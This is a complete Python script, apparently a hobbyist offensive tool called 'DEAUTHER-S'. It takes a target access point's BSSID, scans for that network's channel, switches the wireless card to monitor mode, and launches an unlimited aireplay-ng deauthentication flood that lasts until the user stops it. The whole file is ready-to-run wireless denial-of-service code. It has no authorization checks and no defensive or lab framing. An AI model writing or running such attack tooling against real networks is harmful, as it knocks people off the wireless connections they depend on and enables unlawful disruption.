#!/usr/bin/env python3
import argparse
import subprocess
import re
import os
import signal
import shutil
import sys
from colorama import Fore, Style, init

init(autoreset=True)

REQUIRED_CMDS = ["iw", "aireplay-ng", "ip"]
SHORTCUT_PATH = "/usr/local/bin/deauther"

def check_dependencies():
    missing = [cmd for cmd in REQUIRED_CMDS if not shutil.which(cmd)]
    if missing:
        print(f"{Fore.RED}[!] {Fore.WHITE}Missing dependencies: {', '.join(missing)}")
        print(f"{Fore.YELLOW}[!] {Fore.WHITE}Please install them before continuing!")
        exit(1)

def print_banner():
    print(f"""{Fore.GREEN}
  ==========================================
     {Style.BRIGHT}DEAUTHER-S{Style.NORMAL} by Dx4 & JonX
  ==========================================
    """)

def uninstall_script():
    print_banner()
    if os.path.islink(SHORTCUT_PATH):
        try:
            os.remove(SHORTCUT_PATH)
            print(f"{Fore.GREEN}[+] {Fore.WHITE}Uninstalled successfully from {SHORTCUT_PATH}")
        except Exception as e:
            print(f"{Fore.RED}[!] {Fore.WHITE}Failed to uninstall: {e}")
    else:
        print(f"{Fore.YELLOW}[!] {Fore.WHITE}No installation found at {SHORTCUT_PATH}")
    sys.exit(0)

def get_channel_with_iw(bssid, iface):
    print(f"{Fore.GREEN}[+] {Fore.WHITE}Getting channel for BSSID {bssid} via iw scan...")
    try:
        subprocess.run(["ip", "link", "set", iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", iface, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        scan_output = subprocess.check_output(["iw", iface, "scan"], stderr=subprocess.DEVNULL).decode()
        cell_blocks = scan_output.split("BSS ")
        for block in cell_blocks:
            if bssid.lower() in block.lower():
                match = re.search(r"DS Parameter set: channel (\d+)", block)
                if match:
                    return match.group(1)
    except Exception as e:
        print(f"{Fore.RED}[!] {Fore.WHITE}Error while scanning: {e}")
    return None

def start_deauth(bssid, iface):
    try:
        subprocess.Popen([
            "aireplay-ng", "--deauth", "0", "-a", bssid, iface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        signal.pause()
    except KeyboardInterrupt:
        print(f"\n{Fore.GREEN}[+] {Fore.WHITE}Attack stopped by user.")

def set_monitor_mode(iface):
    subprocess.run(["ip", "link", "set", iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["iw", iface, "set", "monitor", "none"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["ip", "link", "set", iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def set_channel(iface, channel):
    subprocess.run(["iw", iface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    parser = argparse.ArgumentParser(description="Simple Deauth Tool by Dx4 and JonX")
    parser.add_argument("-i", "--iface", help="Wireless interface (ex: wlan0)")
    parser.add_argument("-b", "--bssid", help="Target BSSID")
    parser.add_argument("--uninstall", action="store_true", help="Uninstall the deauther shortcut")
    args = parser.parse_args()

    if args.uninstall:
        uninstall_script()

    print_banner()
    check_dependencies()

    if not args.iface or not args.bssid:
        parser.print_help()
        return

    channel = get_channel_with_iw(args.bssid, args.iface)
    if not channel:
        print(f"{Fore.RED}[!] {Fore.WHITE}Failed to find channel for BSSID!")
        return

    print(f"{Fore.GREEN}[+] {Fore.WHITE}Found channel: {channel}")
    print(f"{Fore.GREEN}[+] {Fore.WHITE}Setting interface {args.iface} to monitor mode on channel {channel}...")
    set_monitor_mode(args.iface)
    set_channel(args.iface, channel)

    print(f"{Fore.GREEN}[+] {Fore.WHITE}Attacking {args.bssid} using interface {args.iface}")
    print(f"{Fore.GREEN}[+] {Fore.WHITE}Press CTRL+C to stop the attack...")

    start_deauth(args.bssid, args.iface)

if __name__ == "__main__":
    main()